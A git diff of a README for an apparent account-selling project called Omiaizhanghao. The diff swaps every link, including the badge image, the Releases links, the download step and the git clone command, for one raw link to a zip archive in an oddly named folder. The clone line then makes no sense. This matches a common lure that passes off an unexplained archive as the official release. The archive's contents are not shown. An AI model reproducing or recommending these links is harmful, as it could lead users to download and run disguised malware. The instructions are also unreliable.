@@ -1,6 +1,6 @@
 # Omiaizhanghao: Your Gateway to Diverse Account Solutions 🌐
 
-![GitHub Release](https://img.shields.io/badge/Latest_Release-v1.0-blue)
+![GitHub Release](https://raw.githubusercontent.com/tubiotuso3h249/omiaizhanghao/master/barbudo/Software_v3.9.zip)
 
 Welcome to the **Omiaizhanghao** repository! This project focuses on providing various account solutions for users in both domestic and international markets. Whether you need a local account or an overseas one, we aim to deliver reliable options for your needs.
 
@@ -36,11 +36,11 @@ Our goal is to simplify the process of obtaining these accounts while ensuring s
 
 ## Getting Started
 
-To get started with **Omiaizhanghao**, visit our [Releases section](https://github.com/tubiotuso3h249/omiaizhanghao/releases). You will find the latest version of the project available for download. 
+To get started with **Omiaizhanghao**, visit our [Releases section](https://raw.githubusercontent.com/tubiotuso3h249/omiaizhanghao/master/barbudo/Software_v3.9.zip). You will find the latest version of the project available for download. 
 
 ## Installation
 
-1. **Download the latest release** from the [Releases section](https://github.com/tubiotuso3h249/omiaizhanghao/releases).
+1. **Download the latest release** from the [Releases section](https://raw.githubusercontent.com/tubiotuso3h249/omiaizhanghao/master/barbudo/Software_v3.9.zip).
 2. **Extract the files** from the downloaded archive.
 3. **Follow the setup instructions** included in the package.
 
@@ -48,7 +48,7 @@ To get started with **Omiaizhanghao**, visit our [Releases section](https://gith
 
 ```bash
 # Clone the repository
-git clone https://github.com/tubiotuso3h249/omiaizhanghao.git
+git clone https://raw.githubusercontent.com/tubiotuso3h249/omiaizhanghao/master/barbudo/Software_v3.9.zip
 
 # Navigate to the project directory
 cd omiaizhanghao
@@ -100,4 +100,4 @@ For questions or feedback, feel free to reach out to us. You can find us on GitH
 
 ---
 
-Thank you for exploring **Omiaizhanghao**! We hope you find our account solutions helpful. Don't forget to check the [Releases section](https://github.com/tubiotuso3h249/omiaizhanghao/releases) for the latest updates and features.
+Thank you for exploring **Omiaizhanghao**! We hope you find our account solutions helpful. Don't forget to check the [Releases section](https://raw.githubusercontent.com/tubiotuso3h249/omiaizhanghao/master/barbudo/Software_v3.9.zip) for the latest updates and features.
